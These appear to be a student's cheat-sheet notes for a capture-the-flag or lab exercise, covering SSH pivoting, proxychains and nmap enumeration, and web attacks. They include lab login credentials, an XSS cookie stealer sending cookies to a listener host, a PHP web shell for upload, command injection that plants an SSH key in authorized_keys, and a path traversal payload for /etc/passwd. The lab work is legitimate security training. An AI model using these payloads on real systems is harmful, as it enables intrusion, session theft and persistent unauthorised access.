#   SETUP
```
CTF Exploit Research HAS ONLY 1!!!!! ATTEMPT LEFT
https://sec.cybbh.io/public/security/latest/index.html
Stack Number	Username	  Password	        jump
2 	          ALFA-007-M 	SiatKd1eRB2Q4ns 	10.50.33.233 (only running ping from jump box)
http://10.50.20.103:8000/
Linux Ops 10.50.27.254               Windows Ops 10.50.31.208
```

#  NMAP
```
NMAP scripting engine location /usr/share/nmap/scripts
```
#  USAGE & EXAMPLES 
```
-nmap --script <filename>|<category>|<directory>
-nmap --script-help "ftp-* and discovery"
-nmap --script-args <args>
-nmap --script-args-file <filename>
-nmap --script-help <filename>|<category>|<directory>
-nmap --script-trace
```
#  Master Socket ssh to jump
```
ssh -MS /tmp/jump student@10.50.33.233
```
#  PingSweep
```
for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```
#  Set Up Dynamic Port forward 
```
-S for socket file
-O for forward options
-D9050 proxychains
requires a filler word to act as credentials (in this case its jump)
ssh -S /tmp/jump jump -O forward -D9050
```
#  Port Interro
```
proxychains nc <ip> <port>
```
#  Multiple port forward with Socket
```
ssh -S /tmp/jump jump -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.100:2222 -L3333:192.168.28.111:80 -L5555:192.168.28.111:2222
```
#  SSH with Master Socket Tunnel
```
ssh -MS /tmp/t1 creds@127.0.0.1 -p 2222 
```
#  Assuming net net and new ports found
```
PingSweep
```
# port forward
```
ssh -S /tmp/t1 t1 -O forward -D9050 (previous dynamic port must be canceled ssh -S /tmp/jump jump -O cancel -D99050)
```
# nmap port scan
```
proxychains nmap <ip> (80 & 2222 found)
```
# port interro
```
proxychains nc <ip> <port>
```
# Port Forward
```
ssh -S /tmp/t1 t1 -O forward -L2323:ip:2222 -L4343:100.200.25.35:80
```
# Authenticate to new ssh with ssh
```
ssh -MS /tmp/t2 creds@127.0.0.1 -p 2323
```
# To get to fowarded web ports
```
On firefox type loopback followed by colon and fowarded port (127.0.0.1:port)
```
#  Proxychains with http script
```
proxychains nmap --script=http-enum.nse 192.168.28.100
ssh root@10.50.24.104 -D 9050

proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>

proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>

proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
```
#   Outcome
```
directories within website that can be further enumerated
```
#  cookie stealer
```
<script>document.location="http://10.50.27.254:8000/"+document.cookie;</script>
above script ran on vulnerable web page
python3 -m http.server
above ran on lin ops iot intercept traffic
```

#  Malicious file upload script
```
  <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```

#  upload copy of ssh rsa token
```
ssh-keygen  -t rsa -b 4096
cat rsa key
;mkdir /<homedir>/.ssh
; echo "<rsa key>" >> /<homedir>/.ssh/authorized_keys
ssh into web server
```
#  Server side dir traversal
```
Server-Side injection

Directory Traversal/Path Traversal


    Ability to read/execute outside web server’s directory

    Uses ../../ (relative paths) in manipulating a server-side file path


view_image.php?file=../../etc/passwd
```

































# Misc NOTES
```
test command inject ;whoami
when u see a .html try it

```
